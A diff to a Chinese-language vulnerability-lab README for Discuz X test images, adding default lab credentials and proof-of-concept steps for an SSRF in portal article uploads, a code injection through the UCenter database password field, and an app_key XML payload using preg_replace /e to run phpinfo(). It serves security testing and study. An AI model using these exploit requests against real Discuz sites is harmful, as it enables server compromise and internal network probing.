@@ -1,3 +1,15 @@
+## 环境说明
+
+* src/discuz/x3.1
+  * 后台地址http://127.0.0.1/admin.php
+  * 管理员账号admin/admin
+  * 测试账号test/123456
+  * 更新日期20150609
+* src/discuz/x3.0
+  - 后台地址http://127.0.0.1/admin.php
+  - 管理员账号admin/admin
+  - 更新日期20130511
+
 ## faq.php gids 报错注入
 
 测试镜像
@@ -65,3 +77,110 @@ curl 'http://127.0.0.1/home.php?mod=spacecp&ac=profile&op=base' -F 'profilesubmi
 
 
 
+## Discuz X门户文章功能SSRF漏洞
+
+测试镜像
+
+- src/discuz/x3.1
+
+影响版本 
+
+- Discuz X系列 <= X3.1
+
+参考链接
+
+- [Discuz X系列门户文章功能SSRF漏洞挖掘与分析](https://www.anquanke.com/post/id/84000)
+
+Poc
+
+使用测试账号test/123456登陆首页，访问url
+
+```
+http://172.17.0.2/forum.php?mod=redirect&goto=findpost&modthreadkey=1&ptid=1&pid=1
+```
+
+在跳转后的页面URL中包含modthreadkey参数，如：
+
+```
+http://172.17.0.2/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=c3564b479d72b05e136e62e2af4762c4#pid1
+```
+
+在跳转后的页面源码中包含formhash参数，如：
+
+```html
+<input type="hidden" name="formhash" value="7d96833f" />
+```
+
+从控制台查看network获取当前cookie，并利用上述获取的两个参数，构造SSRF触发链接：
+
+```
+curl --cookie "获取的cookie" -d "a=a" "http://172.17.0.2/portal.php?mod=portalcp&ac=upload&aid=1&catid=1&op=downremotefile&formhash=7d96833f&modarticlekey=c3564b479d72b05e136e62e2af4762c4&content=%3Cimg%20src=http://172.17.0.1/test_ssrf%231.png%3E
+```
+
+其中参数formhash为页面源码中获取的formhash，modarticlekey为跳转链接中的modthreadkey参数，172.17.0.1为SSRF请求的目标机器IP，在该机器上监听80端口，执行以上curl即可触发SSRF
+
+
+
+## Discuz X后台任意代码执行漏洞
+
+测试镜像
+
+- src/discuz/x3.1
+
+影响版本 
+
+- Discuz X系列 <= X3.3
+
+参考链接
+
+- [Discuz X3.3补丁安全分析](https://www.anquanke.com/post/id/86679)
+
+Poc
+
+使用管理员账号登录后台，在 站长->UCenter设置 页面 修改UCenter 数据库账号为shell_test 密码为 123');phpinfo();//  （该账号已预先添加至测试环境），提交后刷新该设置页面即可。
+
+
+
+## Discuz X已知UCenter app_key代码执行漏洞
+
+测试镜像
+
+- src/discuz/x3.0
+
+影响版本 
+
+- Discuz X系列
+
+参考链接
+
+- [Discuz! X系列远程代码执行漏洞分析](https://www.secpulse.com/archives/35819.html)
+
+Poc
+
+（环境已修改api/uc.php用于生成app_key加密数据）
+
+访问包含formhash的页面，获取其中的formhash的value值:
+
+```
+curl -c cookie.txt "http://172.17.0.2/forum.php" | grep 'formhash" value'
+```
+
+访问加密页面获取code:
+
+```
+curl "http://172.17.0.2/api/uc.php?encode=1" 
+```
+
+通过获取到的变量formhash和code构造并访问链接：
+
+```
+curl -X POST -b cookie.txt --data-raw "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
+<root>
+    <item id=\"balabala\">
+        <item id=\"findpattern\">/.*/e</item>
+        <item id=\"replacement\">phpinfo();</item>
+    </item>
+</root>" "http://172.17.0.2/api/uc.php?formhash=dcac5793&code=0a54WTlZk7uY1TIjIKkpC7bkLgwxnAqnylWAKYTqnbWg0NGt20SBEAeKq6ibWeV81M2MHYFj%2FAd1t3hwZSc64hyG" && rm -f cookie.txt
+```
+
+使用管理员账号登录后台，在 用户->添加用户 页面添加任意用户触发命令执行
